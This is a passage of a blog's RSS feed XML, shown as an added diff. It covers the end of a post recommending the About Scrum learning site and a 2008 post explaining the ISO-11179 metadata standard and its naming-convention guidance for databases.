+<p>This site is intended to be a resource for those who wish to learn about SCRUM and software project management in general. So far it is looking great, they have a couple of videos up and also a bunch of articles.</p>
+<p>Here is a quote for you if you never looked at scrum before</p>
+<blockquote><p>A chicken and a pig are together when the chicken says, &#8220;Let&#8217;s start a restaurant!&#8221;.<br />
+The pig thinks it over and says, &#8220;What would we call this restaurant?&#8221;.<br />
+The chicken says, &#8220;Ham n&#8217; Eggs!&#8221;.<br />
+The pig says, &#8220;No thanks, I&#8217;d be committed, but you&#8217;d only be involved!&#8221;.</p></blockquote>
+<p>So there are pigs and chickens, mmmm what else is there? There is also a Scrum Master, I like to call these Scrum Masters Scrumbags instead  <img src="https://s.w.org/images/core/emoji/2/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br />
+You will learn about the role of pigs and chickens while learning Scrum</p>
+<p>Here is the URL again to About Scrum: http://aboutscrum.com/</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/itprofessionals/ethicsit/want-to-learn-scrum-visit-about-scrum/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>ISO-11179 Naming Conventions</title>
+		<link>/index.php/datamgmt/datadesign/iso-11179-naming-conventions/</link>
+		<comments>/index.php/datamgmt/datadesign/iso-11179-naming-conventions/#respond</comments>
+		<pubDate>Mon, 11 Aug 2008 14:43:02 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[Data Modelling and Design]]></category>
+		<category><![CDATA[best practices]]></category>
+		<category><![CDATA[database]]></category>
+		<category><![CDATA[iso]]></category>
+		<category><![CDATA[naming conventions]]></category>
+		<category><![CDATA[programming]]></category>
+		<category><![CDATA[sql server]]></category>
+
+		<guid isPermaLink="false">/index.php/2008/08/iso-11179-naming-conventions/</guid>
+		<description><![CDATA[Straight from the man himself comes this statement posted in the microsoft.public.sqlserver.programming forum: &#8220;You need to read ISO-11179 so you use proper data element names. You actually had &#8220;tbl-&#8220;on the table names! Sometimes &#8220;id&#8221; id a prefix and sometimes it is a postfix.&#8221; Of course you know who I am talking about? No? Joe Celko [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>Straight from the man himself comes this statement posted in the <a href="http://groups.google.com/group/microsoft.public.sqlserver.programming/browse_thread/thread/b29389050253df78/87d7c1b73e60e41d#87d7c1b73e60e41d">microsoft.public.sqlserver.programming forum</a>: &#8220;<em>You need to read ISO-11179 so you use proper data element names. You<br />
+actually had &#8220;tbl-&#8220;on the table names! Sometimes &#8220;id&#8221; id a<br />
+prefix and sometimes it is a postfix.</em>&#8221;</p>
+<p>Of course you know who I am talking about? No? Joe Celko of course.  So what is ISO-11179?</p>
+<p>The 11179 standard is a multipart standard that includes the following parts:</p>
+<p><a href="http://metadata-standards.org/11179/#11179-1">11179-1</a><br />
+<strong>Part 1: Framework</strong>, introduces and discusses fundamental ideas of data elements, value domains, data element concepts, conceptual domains, and classification schemes essential to the understanding of this set of standards and provides the context for associating the individual parts of ISO/IEC 11179.</p>
+<p><a href="http://metadata-standards.org/11179/#11179-2">11179-2</a><br />
+<strong>Part 2: Classification</strong>, provides a conceptual model for managing classification schemes. There are many structures used to organize classification schemes and there are many subject matter areas that classification schemes describe. So, this Part also provides a two-faceted classification for classification schemes themselves.</p>
+<p><a href="http://metadata-standards.org/11179/#11179-3">11179-3</a><br />
+<strong>Part 3: Registry Metamodel and Basic Attributes</strong>, specifies a conceptual model for a metadata registry. It is limited to a set of basic attributes for data elements, data element concepts, value domains, conceptual domains, classification schemes, and other related classes, called administered items. The basic attributes specified for data elements in ISO/IEC 11179-3:1994 are provided in this revision.</p>
+<p><a href="http://metadata-standards.org/11179/#11179-4">11179-4</a><br />
+<strong>Part 4: Formulation of Data Definitions,</strong> provides guidance on how to develop unambiguous data definitions. A number of specific rules and guidelines are presented in ISO/IEC 11179-4 that specify exactly how a data definition should be formed. A precise, well-formed definition is one of the most critical requirements for shared understanding of an administered item; well-formed definitions are imperative for the exchange of information. Only if every user has a common and exact understanding of the data item can it be exchanged trouble-free.</p>
+<p><a href="http://metadata-standards.org/11179/#11179-5">11179-5</a><br />
+<strong>Part 5: Naming and Identification Principles</strong>, provides guidance for the identification of administered items. Identification is a broad term for designating, or identifying, a particular data item. Identification can be accomplished in various ways, depending upon the use of the identifier. Identification includes the assignment of numerical identifiers that have no inherent meanings to humans; icons (graphic symbols to which meaning has been assigned); and names with embedded meaning, usually for human understanding, that are associated with the data item&#8217;s definition and value domain.</p>
+<p><a href="http://metadata-standards.org/11179/#11179-6">11179-6</a><br />
+<strong>Part 6: Registration</strong>, provides instruction on how a registration applicant may register a data item with a central Registration Authority and the allocation of unique identifiers for each data item. Maintenance of administered items already registered is also specified in this document.</p>
+<p>The one that deals with  naming conventions is <a href="http://metadata-standards.org/11179/#11179-5">11179-5</a> The link will point to a zip file which has a pdf file in it. The TOC of this pdf file is below</p>
+<p>Contents<br />
+Foreword<br />
+1 Scope<br />
+2 Normative references<br />
+3 Terms and definitions<br />
+4 Data Identifiers within a registry<br />
+5 Identification<br />
+6 Names<br />
+6.1 Names in a registry<br />
+6.2 Naming conventions<br />
+7 Development of naming conventions<br />
+7.1 Introduction<br />
+7.2 Scope principle<br />
+7.3 Authority principle<br />
+7.4 Semantic principle<br />
+7.5 Syntactic principle<br />
+7.6 Lexical principle<br />
+7.7 Uniqueness principle<br />
+Annex A (informative) Example naming conventions for names within an MDR registry<br />
+Annex B (informative) Example naming conventions for Asian languages</p>
+<p>So check it out and hopefully you and your team can adapt a common naming conventions instead of having things named like employee_address, EmployeeAddress, employeeAddress and tblEmployeeAddress.</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/datamgmt/datadesign/iso-11179-naming-conventions/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+	</channel>
+</rss>
